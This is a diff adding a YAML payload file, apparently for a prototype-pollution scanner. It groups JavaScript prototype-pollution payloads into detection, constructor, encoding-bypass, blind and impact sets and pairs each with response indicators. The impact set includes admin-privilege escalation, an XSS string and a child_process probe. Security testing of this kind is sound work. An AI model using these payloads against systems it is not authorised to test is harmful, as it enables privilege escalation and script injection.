@@ -1,0 +1,176 @@
+category_map:
+  detect:
+    - proto_basic
+    - proto_admin
+    - proto_role
+    - proto_settings
+    - proto_version
+  constructor:
+    - ctor_basic
+    - ctor_admin
+    - ctor_role
+    - ctor_proto
+    - ctor_inject
+  bypass:
+    - url_encode
+    - double_encode
+    - nested
+    - array_bracket
+    - dot_notation
+  blind:
+    - blind_timing
+    - blind_reflection
+    - blind_stored
+    - blind_header
+    - blind_cookie
+  impact:
+    - impact_isadmin
+    - impact_role
+    - impact_settings
+    - impact_rce
+    - impact_xss
+
+detect_payloads:
+  - - proto_basic
+    - '{"__proto__":{"polluted":true}}'
+    - - polluted
+      - "true"
+      - __proto__
+  - - proto_admin
+    - '{"__proto__":{"isAdmin":true}}'
+    - - isAdmin
+      - "true"
+      - admin
+  - - proto_role
+    - '{"__proto__":{"role":"admin"}}'
+    - - role
+      - admin
+  - - proto_settings
+    - '{"__proto__":{"settings":{"debug":true}}}'
+    - - settings
+      - debug
+      - "true"
+  - - proto_version
+    - '{"__proto__":{"version":"9.9.9"}}'
+    - - version
+      - "9.9.9"
+
+constructor_payloads:
+  - - ctor_basic
+    - '{"constructor":{"prototype":{"polluted":true}}}'
+    - - polluted
+      - "true"
+      - prototype
+  - - ctor_admin
+    - '{"constructor":{"prototype":{"isAdmin":true}}}'
+    - - isAdmin
+      - "true"
+  - - ctor_role
+    - '{"constructor":{"prototype":{"role":"admin"}}}'
+    - - role
+      - admin
+  - - ctor_proto
+    - '{"constructor":{"prototype":{"__proto__":{"polluted":true}}}}'
+    - - polluted
+      - "true"
+      - __proto__
+  - - ctor_inject
+    - '{"constructor":{"prototype":{"toString":"polluted"}}}'
+    - - toString
+      - polluted
+
+bypass_payloads:
+  - - url_encode
+    - "%5B__proto__%5D%5Bpolluted%5D=true"
+    - - polluted
+      - "true"
+      - __proto__
+  - - double_encode
+    - "%255B__proto__%255D%255Bpolluted%255D=true"
+    - - polluted
+      - "true"
+      - __proto__
+  - - nested
+    - '{"__proto__":{"__proto__":{"polluted":true}}}'
+    - - polluted
+      - "true"
+      - __proto__
+  - - array_bracket
+    - "__proto__[polluted]=true"
+    - - polluted
+      - "true"
+      - __proto__
+  - - dot_notation
+    - "__proto__.polluted=true"
+    - - polluted
+      - "true"
+      - __proto__
+
+blind_payloads:
+  - - blind_timing
+    - '{"__proto__":{"timeout":999999}}'
+    - timeout
+    - - "timeout"
+      - "999999"
+  - - blind_reflection
+    - '{"__proto__":{"reflected":"PP_TEST_7X9K2"}}'
+    - PP_TEST_7X9K2
+    - - PP_TEST_7X9K2
+  - - blind_stored
+    - '{"__proto__":{"stored":"PP_STORED_3M8N5"}}'
+    - stored
+    - - PP_STORED_3M8N5
+  - - blind_header
+    - '{"__proto__":{"x-custom-header":"PP_HDR_4L6P1"}}'
+    - x-custom-header
+    - - PP_HDR_4L6P1
+  - - blind_cookie
+    - '{"__proto__":{"session":"PP_SESS_2K7W9"}}'
+    - session
+    - - PP_SESS_2K7W9
+
+impact_payloads:
+  - - impact_isadmin
+    - '{"__proto__":{"isAdmin":true}}'
+    - - isAdmin
+      - "true"
+      - admin
+      - authorized
+  - - impact_role
+    - '{"__proto__":{"role":"admin"}}'
+    - - role
+      - admin
+      - administrator
+  - - impact_settings
+    - '{"__proto__":{"settings":{"debug":true,"admin":true}}}'
+    - - settings
+      - debug
+      - admin
+      - "true"
+  - - impact_rce
+    - '{"__proto__":{"child_process":{}}}'
+    - - child_process
+      - exec
+      - spawn
+  - - impact_xss
+    - '{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}'
+    - - innerHTML
+      - alert
+      - onerror
+
+ssi_params:
+  - data
+  - json
+  - payload
+  - input
+  - value
+  - content
+  - body
+  - params
+  - query
+  - config
+  - options
+  - settings
+  - item
+  - object
+  - model
